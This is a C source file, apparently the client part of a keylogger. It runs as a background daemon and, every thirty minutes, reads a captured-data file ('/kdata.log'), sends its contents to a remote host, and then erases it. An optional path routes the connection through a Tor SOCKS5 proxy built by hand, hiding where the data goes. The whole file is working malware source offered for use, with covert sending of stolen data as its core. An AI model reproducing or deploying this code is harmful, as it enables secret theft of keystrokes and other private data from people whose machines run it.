//Client ...
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <syslog.h>
#include <time.h>

#define tor_here
#define host_ip "host_ip_here"
#define host_port "host_port_here"
#define tor_ip "tor_ip_here"
#define tor_port "tor_port_here"
void DEAMON()
{
  //Process IDand session ID
  pid_t pid, sid;

  pid = fork(); //Fork of the parent Process
  if(pid < 0)
    exit(EXIT_FAILURE);
  if(pid > 0)
    exit(EXIT_SUCCESS);
  umask(0); //Change file mode umask
  sid = setsid();

  if(sid < 0)
    exit(EXIT_FAILURE);

  if((chdir("/")) < 0) //Change current working directory
    exit(EXIT_FAILURE);

  //Close standard output file descriptors
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
}

void print_data(const char *msg , int ext)
{
  struct tm time_info;
  time_t r_time;
  time(&r_time);
  time_info = *(gmtime(&r_time));
  FILE *p = fopen("log" , "a");
  fprintf(p , " - %02d:%02d\t%s\n", time_info.tm_hour, time_info.tm_min , msg);
  if(ext == 1){
    fprintf(p , " - %02d:%02d\t%s\n", time_info.tm_hour, time_info.tm_min , "Action: Exit");
    fclose(p);
    exit(0);
  }
  fclose(p);
}



int main(int argc, char *argv[])
{
  if (argc < 5) {
    fprintf(stderr,"usage %s 'TOR IP' 'TOR PORT' 'HOST IP' 'HOST PORT'\n", argv[0]);
    exit(0);
  }
  DEAMON();
  while(1)
  {
    #ifdef MACRO
      // Connection to server with TOR
      print_data("Action: Wake..." , 0);
      int sockfd, portno, n;
      struct sockaddr_in serv_addr;
      struct hostent *server;

      sockfd = socket(AF_INET, SOCK_STREAM, 0);

      if (sockfd < 0)
          print_data("ERROR: Opening Socket" , 1);

      char buffer[256];
      portno = atoi(tor_port);
      server = gethostbyname(tor_ip);
      if (server == NULL) {
          print_data("ERROR: no such host" , 1);
      }

      bzero((char *) &serv_addr, sizeof(serv_addr));
      serv_addr.sin_family = AF_INET;
      bcopy((char *)server->h_addr,
           (char *)&serv_addr.sin_addr.s_addr,
           server->h_length);
      serv_addr.sin_port = htons(portno);
      while (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0)
          sleep(1);
      print_data("Pass: Connected to TOR Server" , 0);

      char Req1[3] =
      {
        0x05, // SOCKS 5
        0x01, // One Authentication Method
        0x00  // No AUthentication
      };

      send(sockfd, Req1, 3, MSG_NOSIGNAL);

      char Resp1[2];
      recv(sockfd, Resp1, 2, 0);
      if(Resp1[1] != 0x00)
        print_data("Error: Error Authenticating" , 1);

      print_data("Action: Fetching..." , 0);

      char  DomainLen = (char)strlen(host_ip);
      short Port = htons(atoi(host_port));

      char TmpReq[4] = {
            0x05, // SOCKS5
            0x01, // CONNECT
            0x00, // RESERVED
            0x03, // DOMAIN
        };

      int k = 4 + 1 + DomainLen + 2;
      char* Req2 = malloc(k * sizeof(char));

      memcpy(Req2, TmpReq, 4);                // 5, 1, 0, 3
      memcpy(Req2 + 4, &DomainLen, 1);        // Domain Length
      memcpy(Req2 + 5, host_ip, DomainLen);    // Domain
      memcpy(Req2 + 5 + DomainLen, &Port, 2); // Port

      send(sockfd, (char*)Req2, 4 + 1 + DomainLen + 2, MSG_NOSIGNAL);

      char Resp2[10];
      recv(sockfd, Resp2, 10, 0);
      if(Resp2[1] != 0x00)
        return(-1); // ERROR

      print_data("Action: Connected to hosting server..." , 0);

      FILE *fl = fopen("/kdata.log" , "r");
      while(!feof(fl)){
      bzero(buffer,256);
      fgets(buffer,255,fl);

      n = write(sockfd,buffer,strlen(buffer));
      if (n <= 0){

      }

      }

      fclose(fl);
      fclose(fopen("/kdata.log" , "w"));
      close(sockfd);
      print_data("Action: Sleep..." , 0);
      sleep(1800);
    #else
      // Connection to server without TOR
      int sockfd, portno, n;
      struct sockaddr_in serv_addr;
      struct hostent *server;

      sockfd = socket(AF_INET, SOCK_STREAM, 0);

      if (sockfd < 0)
          print_data("ERROR: Opening Socket" , 1);

      char buffer[256];
      portno = atoi(host_port);
      server = gethostbyname(host_ip);
      if (server == NULL) {
          print_data("ERROR: no such host" , 1);
      }

      bzero((char *) &serv_addr, sizeof(serv_addr));
      serv_addr.sin_family = AF_INET;
      bcopy((char *)server->h_addr,
           (char *)&serv_addr.sin_addr.s_addr,
           server->h_length);
      serv_addr.sin_port = htons(portno);
      while (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0)
          sleep(1);
      print_data("Pass: Connected to remote server" , 0);
      
      FILE *fl = fopen("/kdata.log" , "r");
      while(!feof(fl)){
      bzero(buffer,256);
      fgets(buffer,255,fl);

      n = write(sockfd,buffer,strlen(buffer));
      if (n <= 0){

      }

      }

      fclose(fl);
      fclose(fopen("/kdata.log" , "w"));
      close(sockfd);
      print_data("Action: Sleep..." , 0);
      sleep(1800);


    #endif
  }
  _exit(0);
}
